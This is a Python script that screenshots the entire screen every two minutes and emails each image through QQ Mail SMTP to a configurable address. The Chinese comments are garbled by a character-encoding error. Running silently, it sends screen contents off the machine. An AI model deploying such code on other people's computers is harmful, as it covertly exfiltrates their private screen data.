import requests
import smtplib
import schedule
import time
from bs4 import BeautifulSoup
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
from email.header import Header
from PIL import ImageGrab
import os

account =  ''  # å‘ä»¶äºº
password = ''  # QQé‚®ç®±æˆæƒç 
receiver = ' ' # æ”¶ä»¶äºº  ï¼Œå‘ä»¶äººå’Œæ”¶ä»¶äººå¯ç›¸åŒã€‚


def send_email():
    try:
        mailhost = 'smtp.qq.com'
        qqmail = smtplib.SMTP_SSL(host='smtp.qq.com')
        qqmail.connect(mailhost, 465)
        qqmail.login(account, password)

        # ä»¥htmlæ ¼å¼æ„å»ºé‚®ä»¶å†…å®¹
        send_str = '''
        <html>
        <body>
        <center>name</center>
        <img src="cid:image1" alt="image1" align="center" width=100% >
        <center>ğŸ‘»</center>
        </body>
        </html>
        '''

        # æ„å»ºmessage
        message = MIMEMultipart()
        # æ·»åŠ é‚®ä»¶å†…å®¹
        content = MIMEText(send_str, _subtype='html', _charset='utf8')
        message.attach(content)

        # æ„å»ºå¹¶æ·»åŠ å›¾åƒå¯¹è±¡

        now = time.localtime()
        nowt = time.strftime("%Y-%m-%d-%H-%M", now)  # å›¾ç‰‡ä»¥æ—¥æœŸå‘½å
        img1 = MIMEImage(open(nowt+'.jpg', 'rb').read(), _subtype='octet-stream')
        img1.add_header('Content-ID', 'image1')
        message.attach(img1)

        # æ„å»ºå¹¶æ·»åŠ é™„ä»¶å¯¹è±¡
        img = MIMEImage(open(nowt+ '.jpg', 'rb').read(), _subtype='octet-stream')
        img.add_header('Content-Disposition', 'attachment', filename=nowt+ '.jpg')
        message.attach(img)

        now1 = time.localtime()
        nowt2 = time.strftime("%Y-%m-%d %H:%M:%S", now1) #ä¸»é¢˜åŠ æ—¥æœŸ
        subject = '6#'+nowt2                             #ä¸»é¢˜å¯è‡ªå®šä¹‰
        message['Subject'] = Header(subject)
        
        try:
            qqmail.sendmail(account, receiver, message.as_string())
            print('é‚®ä»¶å‘é€æˆåŠŸ')
        except:
            print('é‚®ä»¶å‘é€å¤±è´¥')
        qqmail.quit()
    except Exception as result:
        print('å‘é€å¤±è´¥')


def job():
    # ç”µè„‘å±å¹•æˆªå±
    now = time.localtime()
    nowt = time.strftime("%Y-%m-%d-%H-%M", now)
    img = ImageGrab.grab()
    img.save(nowt+ ".jpg")
    print('å¼€å§‹ä¸€æ¬¡ä»»åŠ¡')
    send_email()
    os.remove(nowt + ".jpg")     #å‘é€å®Œåè‡ªåŠ¨åˆ é™¤
    print('ä»»åŠ¡å®Œæˆ')


schedule.every(2).minutes.do(job) #å‘é€æ—¶é—´å¯è‡ªå®šä¹‰ 
while True:
    schedule.run_pending()
    time.sleep(1)
